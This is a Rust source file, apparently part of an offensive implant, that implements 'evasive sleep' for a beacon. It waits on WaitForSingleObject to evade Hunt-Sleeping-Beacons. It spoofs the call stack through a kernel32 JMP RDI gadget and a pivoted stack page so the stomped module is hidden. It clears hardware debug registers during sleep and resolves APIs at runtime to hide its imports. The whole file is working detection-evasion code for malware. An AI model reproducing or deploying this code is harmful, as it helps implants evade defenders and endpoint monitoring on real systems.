// sleep.rs
// Evasive sleep: callstack-spoofed WaitForSingleObject with DR hygiene.
//
// Three layers of evasion:
//
// 1. WaitForSingleObject(NtCurrentProcess) instead of Sleep/SleepEx —
//    produces a different wait reason than NtDelayExecution, bypassing
//    Hunt-Sleeping-Beacons' primary heuristic.
//
// 2. Callstack spoofing — allocates a clean 4KB stack page, places a
//    JMP RDI gadget (found in kernel32) as the return address, and JMPs
//    to WFSO.  During sleep the callstack shows only ntdll/kernel32
//    frames; the stomped module never appears in the walk.
//
// 3. Hardware breakpoint hygiene — DR0-DR7 are saved and cleared before
//    sleeping, then restored after.  Defeats HSB's scan for active
//    hardware breakpoints on sleeping threads.
//
// All functions resolved at runtime via GetProcAddress to keep them out
// of the import table.

use std::ffi::c_void;

use windows::core::s;
use windows::Win32::System::LibraryLoader::{GetModuleHandleA, GetProcAddress};

type FnWaitForSingleObject = unsafe extern "system" fn(usize, u32) -> u32;
type FnGetCurrentProcess   = unsafe extern "system" fn() -> usize;
type FnGetCurrentThread    = unsafe extern "system" fn() -> *mut c_void;
type FnGetThreadContext    = unsafe extern "system" fn(*mut c_void, *mut u8) -> i32;
type FnSetThreadContext    = unsafe extern "system" fn(*mut c_void, *const u8) -> i32;
type FnVirtualAlloc        = unsafe extern "system" fn(*mut c_void, usize, u32, u32) -> *mut c_void;
type FnVirtualFree         = unsafe extern "system" fn(*mut c_void, usize, u32) -> i32;

// AMD64 CONTEXT offsets
const CTX_SIZE:  usize = 0x4D0;
const OFF_FLAGS: usize = 0x030;
const OFF_DR0:   usize = 0x048;
const OFF_DR1:   usize = 0x050;
const OFF_DR2:   usize = 0x058;
const OFF_DR3:   usize = 0x060;
const OFF_DR6:   usize = 0x068;
const OFF_DR7:   usize = 0x070;
const CONTEXT_DEBUG_REGISTERS: u32 = 0x0010_0010;

// Memory constants
const MEM_COMMIT:     u32 = 0x1000;
const MEM_RESERVE:    u32 = 0x2000;
const MEM_RELEASE:    u32 = 0x8000;
const PAGE_READWRITE: u32 = 0x04;

unsafe fn resolve(module: usize, name: *const u8) -> usize {
    use windows::Win32::Foundation::HMODULE;
    use windows::core::PCSTR;
    GetProcAddress(HMODULE(module as *mut c_void), PCSTR(name))
        .map(|f| f as usize)
        .unwrap_or(0)
}

/// Scan executable sections of a loaded module for a two-byte gadget.
unsafe fn find_gadget(base: usize, pattern: &[u8]) -> Option<usize> {
    let b = base as *const u8;
    let e_lfanew = *(b.add(0x3C) as *const i32) as usize;
    let pe = b.add(e_lfanew);
    let n_sec   = *(pe.add(6) as *const u16) as usize;
    let opt_sz  = *(pe.add(20) as *const u16) as usize;
    let sec_tbl = pe.add(24 + opt_sz);

    for i in 0..n_sec {
        let s = sec_tbl.add(i * 40);
        // IMAGE_SCN_MEM_EXECUTE
        if *(s.add(36) as *const u32) & 0x2000_0000 == 0 { continue; }

        let vsize = *(s.add(8)  as *const u32) as usize;
        let vrva  = *(s.add(12) as *const u32) as usize;
        if vsize < pattern.len() { continue; }

        let start = base + vrva;
        for j in 0..=(vsize - pattern.len()) {
            let mut ok = true;
            for k in 0..pattern.len() {
                if *((start + j + k) as *const u8) != pattern[k] { ok = false; break; }
            }
            if ok { return Some(start + j); }
        }
    }
    None
}

pub unsafe fn obf_sleep(millis: u32) {
    let k32 = match GetModuleHandleA(s!("kernel32")) {
        Ok(h)  => h.0 as usize,
        Err(_) => {
            std::thread::sleep(std::time::Duration::from_millis(millis as u64));
            return;
        }
    };

    macro_rules! sym {
        ($name:literal) => {{
            let a = resolve(k32, concat!($name, "\0").as_ptr() as *const u8);
            if a == 0 {
                std::thread::sleep(std::time::Duration::from_millis(millis as u64));
                return;
            }
            a
        }};
    }

    let fn_wfso: FnWaitForSingleObject = std::mem::transmute(sym!("WaitForSingleObject"));
    let fn_gcp:  FnGetCurrentProcess   = std::mem::transmute(sym!("GetCurrentProcess"));
    let fn_va:   FnVirtualAlloc        = std::mem::transmute(sym!("VirtualAlloc"));
    let fn_vf:   FnVirtualFree         = std::mem::transmute(sym!("VirtualFree"));

    // ── Save & clear hardware breakpoints before sleeping ────────────────────
    let dr_state = save_and_clear_dr(k32);

    let handle = fn_gcp();

    // ── Callstack-spoofed sleep ──────────────────────────────────────────────
    //
    // Find a JMP RDI (FF E7) gadget in kernel32.  Allocate a clean stack
    // page (zeroed, no stomped-module addresses).  Place the gadget as the
    // return address, stash the real restore-label in RDI (callee-saved,
    // preserved by WFSO), and JMP — not CALL — to WaitForSingleObject.
    //
    // During sleep the stack walk sees:
    //   ntdll!NtWaitForSingleObject → kernel32!WaitForSingleObject →
    //   kernel32!<gadget> → 0 (walk terminates)
    //
    // When WFSO returns: ret → gadget → JMP RDI → restore label →
    // restore original RSP, free the page, continue.

    let spoofed = match find_gadget(k32, &[0xFF, 0xE7]) {
        Some(gadget_addr) => {
            let page = fn_va(
                core::ptr::null_mut(), 0x1000,
                MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE,
            );
            if page.is_null() {
                false
            } else {
                let top = page as usize + 0x1000;

                // Stack layout (grows downward):
                //   [top - 40] = gadget addr   <- RSP (return address for WFSO)
                //   [top - 32] = 0             \
                //   [top - 24] = 0              |  32-byte shadow space (zeroed)
                //   [top - 16] = 0              |
                //   [top -  8] = 0             /
                //
                // RSP = top - 40 = 16n + 8  (correct x64 post-call alignment)
                *((top - 40) as *mut usize) = gadget_addr;
                let clean_rsp = top - 40;

                core::arch::asm!(
                    // Save original RSP in R12 (callee-saved, WFSO preserves)
                    "mov r12, rsp",
                    // Load restore-label address into RDI (callee-saved on Win x64)
                    "lea rdi, [rip + 2f]",
                    // Pivot to the clean stack
                    "mov rsp, {clean_rsp}",
                    // Set up WFSO arguments (x64: rcx, edx)
                    "mov rcx, {handle}",
                    "mov edx, {millis:e}",
                    // JMP (not CALL) — no return address from our module is pushed
                    "jmp {wfso}",
                    // ── Restore label ────────────────────────────────────
                    // WFSO ret → gadget (jmp rdi) → here
                    "2:",
                    "mov rsp, r12",
                    clean_rsp = in(reg) clean_rsp,
                    handle    = in(reg) handle,
                    millis    = in(reg) millis,
                    wfso      = in(reg) fn_wfso as usize,
                    out("rax") _, out("rcx") _, out("rdx") _,
                    out("r8")  _, out("r9")  _, out("r10") _,
                    out("r11") _, out("rdi") _, out("r12") _,
                );

                fn_vf(page, 0, MEM_RELEASE);
                true
            }
        }
        None => false,
    };

    // Fallback: direct call (no spoofing)
    if !spoofed {
        fn_wfso(handle, millis);
    }

    // ── Restore hardware breakpoints after waking ────────────────────────────
    if let Some(state) = dr_state {
        restore_dr(k32, &state);
    }
}

// ── DR register save / clear / restore ───────────────────────────────────────

struct DrState {
    dr0: u64, dr1: u64, dr2: u64, dr3: u64, dr6: u64, dr7: u64,
}

unsafe fn save_and_clear_dr(k32: usize) -> Option<DrState> {
    let get_thr: FnGetCurrentThread = std::mem::transmute(resolve(k32, b"GetCurrentThread\0".as_ptr()));
    let get_ctx: FnGetThreadContext = std::mem::transmute(resolve(k32, b"GetThreadContext\0".as_ptr()));
    let set_ctx: FnSetThreadContext = std::mem::transmute(resolve(k32, b"SetThreadContext\0".as_ptr()));

    if (get_thr as usize) == 0 || (get_ctx as usize) == 0 || (set_ctx as usize) == 0 {
        return None;
    }

    let thread = get_thr();

    #[repr(C, align(16))]
    struct Ctx([u8; CTX_SIZE]);
    let mut ctx = Ctx([0u8; CTX_SIZE]);
    let p = ctx.0.as_mut_ptr();

    *(p.add(OFF_FLAGS) as *mut u32) = CONTEXT_DEBUG_REGISTERS;
    if get_ctx(thread, p) == 0 { return None; }

    let dr0 = *(p.add(OFF_DR0) as *const u64);
    let dr7 = *(p.add(OFF_DR7) as *const u64);

    // Nothing to do if no breakpoints are set
    if dr0 == 0 && dr7 & 0xFF == 0 { return None; }

    let state = DrState {
        dr0,
        dr1: *(p.add(OFF_DR1) as *const u64),
        dr2: *(p.add(OFF_DR2) as *const u64),
        dr3: *(p.add(OFF_DR3) as *const u64),
        dr6: *(p.add(OFF_DR6) as *const u64),
        dr7,
    };

    // Clear all DR registers
    *(p.add(OFF_DR0) as *mut u64) = 0;
    *(p.add(OFF_DR1) as *mut u64) = 0;
    *(p.add(OFF_DR2) as *mut u64) = 0;
    *(p.add(OFF_DR3) as *mut u64) = 0;
    *(p.add(OFF_DR6) as *mut u64) = 0;
    *(p.add(OFF_DR7) as *mut u64) = 0;

    set_ctx(thread, p);

    Some(state)
}

unsafe fn restore_dr(k32: usize, state: &DrState) {
    let get_thr: FnGetCurrentThread = std::mem::transmute(resolve(k32, b"GetCurrentThread\0".as_ptr()));
    let get_ctx: FnGetThreadContext = std::mem::transmute(resolve(k32, b"GetThreadContext\0".as_ptr()));
    let set_ctx: FnSetThreadContext = std::mem::transmute(resolve(k32, b"SetThreadContext\0".as_ptr()));

    if (get_thr as usize) == 0 || (get_ctx as usize) == 0 || (set_ctx as usize) == 0 {
        return;
    }

    let thread = get_thr();

    #[repr(C, align(16))]
    struct Ctx([u8; CTX_SIZE]);
    let mut ctx = Ctx([0u8; CTX_SIZE]);
    let p = ctx.0.as_mut_ptr();

    *(p.add(OFF_FLAGS) as *mut u32) = CONTEXT_DEBUG_REGISTERS;
    if get_ctx(thread, p) == 0 { return; }

    *(p.add(OFF_DR0) as *mut u64) = state.dr0;
    *(p.add(OFF_DR1) as *mut u64) = state.dr1;
    *(p.add(OFF_DR2) as *mut u64) = state.dr2;
    *(p.add(OFF_DR3) as *mut u64) = state.dr3;
    *(p.add(OFF_DR6) as *mut u64) = state.dr6;
    *(p.add(OFF_DR7) as *mut u64) = state.dr7;

    set_ctx(thread, p);
}
